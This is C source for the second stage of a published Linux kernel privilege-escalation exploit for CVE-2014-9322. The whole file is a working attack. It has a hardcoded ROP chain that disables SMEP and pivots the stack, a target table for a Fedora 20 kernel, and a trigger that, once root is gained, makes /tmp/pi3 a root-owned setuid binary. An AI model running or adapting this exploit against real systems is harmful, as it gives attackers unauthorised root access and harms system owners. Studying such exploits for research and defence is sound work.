/*
 * Second stage of attack for the CVE-2014-9322
 *
 * Whole exploit based on amazing article / research
 * by Rafal 'n3rgal' Wojtczuk
 *
 * http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/
 *
 * Some modifications and adjustments by me ;p
 *
 * April 2015
 * Adam 'pi3' Zabrocki
 */

#include <sys/mman.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>

#define MAX_TARGETS 1    // Currently not many ;)

void FC_20_def_prep_root(void);

struct p_targets {

   char *p_name;
   void (*prep_root)(void);   // prepare ROP

} p_tar[MAX_TARGETS] = {

   {
      "3.11.10-301.fc20.x86_64",
      FC_20_def_prep_root
   }

};

extern void pi3_kcode();

void FC_20_def_prep_root(void) {

  int i;
  unsigned long *begin, *stack=(unsigned long*)0x8119f1ed;
  void *stackmap = mmap((void*)0x81190000, 0x10000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
  long *root = mmap((void*)0x1000, 0x10000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
  char *ops = mmap((void*)0x41010000ULL, 0x6000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);

  if (root == MAP_FAILED || ops==MAP_FAILED||stackmap==MAP_FAILED) {
    perror("mmap");
    exit(1);
  }

  if (mlock(ops,0x1000) == -1) {
     perror("mlock(ops,0x1000)");
     exit(-1);
  }

  for (i = 0; i < 0x10000/8 ;i++)
    root[i] = 0x41014101ULL;
  for (i =0; i<0x6000/8-1;i++)
    *(unsigned long*)(ops+1+8*i) = 0xffffffff8119f1edULL; // stack pivot

  chdir("/proc");
  begin=stack;

  *stack++=0xffffffff81307bcdULL;       // pop rdi, ret
  *stack++=0x407f0;                     // cr4 nonsmep PAE disabled
  *stack++=0xffffffff8104c394ULL;       // mov rdi, cr4; pop %rbp; ret
  *stack++=0xaabbccdd;                  // junk
  *stack++=(unsigned long)pi3_kcode;    // kernel code exec (our shellcode)

  *(unsigned long*)0x41014101=0xffffffff812b1ab8ULL; // add 0x450, rsp; 6xpop; ret
  stack=(unsigned long*)(0x41014101+0x450+6*8);

  *stack++=0xffffffff812b1ac9; // ret
  *stack++=0xffffffff812b1ac9; // ret
  *stack++=0xffffffff812b1ac9; // ret
  *stack++=0xffffffff812b1ac9; // ret
  *stack++=0xffffffff812b1ac9; // ret
  *stack++=0xffffffff812b1ac9; // ret
  *stack++=0xffffffff8152d8fe; // push %rax, pop %rax, pop %rbp, ret
  *stack++=0xffffffff812b1ac9; // ret - for junk
  memcpy(stack, begin, 8*8); 

}

void trigger(void) {

   int fd=-1;

   while (fd<0) {
      fd = open("A", O_RDONLY);
      if (!getuid()) {
         char *p_argv[] = { "/bin/sh", "-c",
         "chown root.root /tmp/pi3; chmod 777 /tmp/pi3; chmod +s /tmp/pi3", NULL };
         execv("/bin/sh",p_argv,NULL);
      }
   }

   if (fd!=-1)
      close(fd);
}


int main(int argc, char *argv[]) {

   unsigned int tmp;

   if (argc != 2) {
      printf("\n\t...::: -=[ Exploit for CVE-2014-9322 ]=- :::...\n");
      printf("\t                   by Rafal 'n3rgal' Wojtczuk\n");
      printf("\t                   && Adam 'pi3' Zabrocki\n");
      printf("\n\t\tUsage: %s <number>\n\n",argv[0]);
      printf("\t\t\tNumber:\n\n");
      for (tmp = 0x0; tmp < MAX_TARGETS; tmp++)
         printf("\t\t\t\t%d - kernel [%s]\n",tmp+1,p_tar[tmp].p_name);
      printf("\n");
      exit(-1);
   }

   printf("\n\t...::: -=[ Exploit for CVE-2014-9322 ]=- :::...\n");
   printf("\t                   by Rafal 'n3rgal' Wojtczuk\n");
   printf("\t                   && Adam 'pi3' Zabrocki\n");
   tmp = atoi(argv[1])-1;
   printf("\n\t[+] Using kernel target: %s\n",p_tar[tmp].p_name);

   p_tar[tmp].prep_root();
   sleep(1);
//   getchar();
   trigger();
   
// We should be overwritten by exec*() anyway... so why return? to make compiler silent ;p
   return 0x0;

}
